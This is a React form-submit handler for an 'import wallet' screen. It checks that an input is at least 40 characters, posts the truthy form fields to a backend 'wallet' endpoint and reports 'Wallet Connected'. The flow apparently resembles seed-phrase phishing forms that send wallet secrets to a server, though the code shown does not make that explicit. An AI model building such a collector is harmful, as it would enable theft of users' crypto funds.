import { toast } from "react-toastify";
import { Request } from "../../../helpers/request";

export const handleFormSubmit = async ({
  e,
  state,
  setImportWallet,
  message,
  setmessage,
}) => {
  e.preventDefault();
  const id = toast.loading("Processing...");
  if (message.length < 40) {
    toast.update(id, {
      render: "This field cannot be less 40 characters",
      type: "warning",
      isLoading: false,
      autoClose: 1000,
    });
    return;
  }
  setImportWallet(true);
  const keys = Object.keys(state);
  const values = Object.values(state);

  const obj = {};
  // loop through the values and get it's corresponding key if it is true
  values.map((item, idx) => {
    if (item) {
      obj[keys[idx]] = item;
    }
    return obj;
  });

  const request = new Request("wallet");
  const getMessage = await request.getMessage(obj);
  setImportWallet(false);

  if (!getMessage.status) {
    return toast.update(id, {
      render: getMessage.message || "An error occurred. Try again later",
      type: "error",
      isLoading: false,
      autoClose: 2000,
    });
  }
  if (getMessage.status) {
    setmessage("");
    toast.update(id, {
      render: "Wallet Connected",
      type: "success",
      isLoading: false,
      autoClose: 5000,
    });
  }
};
